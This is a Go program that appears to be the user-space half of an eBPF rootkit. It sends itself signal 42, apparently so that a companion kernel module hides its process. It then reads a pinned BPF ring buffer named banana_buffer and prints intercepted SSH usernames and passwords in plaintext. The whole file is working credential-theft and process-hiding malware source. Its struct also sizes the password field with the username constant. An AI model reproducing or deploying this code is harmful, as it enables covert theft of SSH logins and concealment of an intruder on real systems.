package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"syscall"

	LOG "github.com/charmbracelet/log"
	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/ringbuf"
)

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang bpf choco.bpf.c
const (
	MAX_USERNAME_LEN = 30
	MAX_PASSWORD_LEN = 50
)

type SSHUserPass struct {
	Type     uint8
	Username [MAX_USERNAME_LEN]byte
	Password [MAX_USERNAME_LEN]byte
}

func main() {
	LOG.Info("starting.\r")

	err := syscall.Kill(os.Getpid(), syscall.Signal(42))
	if err == nil {
		LOG.Fatal("cannot hide myself!")
		return
	}

	prog, err := ebpf.LoadPinnedMap("/sys/fs/bpf/banana_buffer", nil)
	if err != nil {
		LOG.Fatal("cannot load pinned program.. %v", err)
	}
	defer prog.Close()
	rbReader, err := ringbuf.NewReader(prog)
	if err != nil {
		LOG.Fatal("cannot create a new ring buffer reader %v!", err)
	}
	defer rbReader.Close()

	for {
		record, err := rbReader.Read()
		if err != nil {
			LOG.Fatal("error: %v", err)
			return
		}
		event_type := record.RawSample[0]
		switch event_type {
		case 69:
			var event SSHUserPass

			err = binary.Read(
				bytes.NewReader(record.RawSample),
				binary.LittleEndian,
				&event,
			)
			if err != nil {
				LOG.Debug("error reading event: %v", err)
				continue
			}
			username := extractString(event.Username[:])
			password := extractString(event.Password[:])
			LOG.Info(fmt.Sprintf("\nUsername: %s\nPassword: %s\n", username, password))
		}

	}
}

func extractString(b []byte) string {
	// Find the null terminator
	n := bytes.IndexByte(b, 0)
	if n == -1 {
		// No null terminator found, use entire array
		n = len(b)
	}
	return string(b[:n])
}
